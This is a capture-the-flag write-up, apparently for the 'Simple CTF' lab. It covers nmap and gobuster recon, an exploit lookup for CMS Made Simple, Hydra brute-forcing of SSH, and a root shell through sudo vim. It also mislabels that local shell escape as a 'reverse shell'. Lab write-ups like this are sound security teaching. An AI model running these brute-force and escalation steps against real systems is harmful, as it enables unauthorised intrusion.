# SimpleCTF
**IP:10.10.170.79**

## Recon

### PortScanning
```sh
└─$ nmap -sS -sV -O 10.10.170.79 >> ports.txt


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 15:40 EDT
Nmap scan report for 10.10.170.79
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```
**Aggressive**
```sh

└─$ sudo nmap -A -p 21,80,2222 10.10.170.79 >> aggressive_ports.txt


PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.88.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 

```

> ### **ftp: anonymous**  
> ### **http: robots.txt**   
> ### **ssh:  OpenSSH 7.2p2**  

### Directory Enum
```sh
└─$ gobuster dir -u http://10.10.170.79/ -w /usr/share/wordlists/dirb/common.txt -o directory.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.170.79/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.170.79/simple/]

```

- `http://10.10.170.79/simple/` for this one we are getting a webserver 

![image](https://github.com/user-attachments/assets/3da0bdf9-69cf-4e2b-9a1d-0abcd5389f9e)

- There is a Username here

![image1](https://github.com/user-attachments/assets/12cb3abf-30af-44f0-9d38-981c7005054d)

- UserName is `mitch`
- It could be a username for the ssh login

- After scrolling a little bit I found the version of the site generator.

![image2](https://github.com/user-attachments/assets/a7b350e2-9919-4a67-82d4-9f6e66387f39)

- **CMS Made Simple version 2.2.8** 

### SearchSploit

```sh
└─$ searchsploit 'CMS Made Simple 2.2.8'
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                              | php/webapps/46635.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                    
```

```sh
└─$ searchsploit -m 46635                     
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/bc-here/CTF{}/THM/simpleCTF/46635.py


```
```sh
└─$ python3 46635.py -u http://10.10.170.79/simple/ -w /usr/share/wordlists/rockyou.txt
  File "/home/bc-here/CTF{}/THM/simpleCTF/46635.py", line 25
    print "[+] Specify an url target"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)                                
```

- **As this is not giving us anything we can try our UserName with the rockyou.txt by hydra to bruteforce shh login**

### Hydra
```sh
└─$ hydra -s 2222 -l mitch -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.170.79
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-25 18:14:59
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.170.79:2222/
[2222][ssh] host: 10.10.170.79   login: mitch   password: secret

```


> ### UserName: mitch
> ### password: secret

### SSH login
```sh
└─$ sudo ssh mitch@10.10.170.79 -p 2222
[sudo] password for ****** : 
mitch@10.10.170.79's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Thu Jul 25 23:31:52 2024 from 10.17.88.30
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!

```

> ### user.txt : `G00d j0b, keep up!`

```sh
$ cd /home
$ ls
mitch  sunbath

```
> ### another User : `sunbath`

### PrivEsc

```sh
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```
- **The vim has the root permission**

```sh
$ sudo vim -c ':!/bin/sh'

# cd /root                         
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!

```
- From [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#sudo) we found the reverse shell for vim

> ### root.txt : `W3ll d0n3. You made it!`
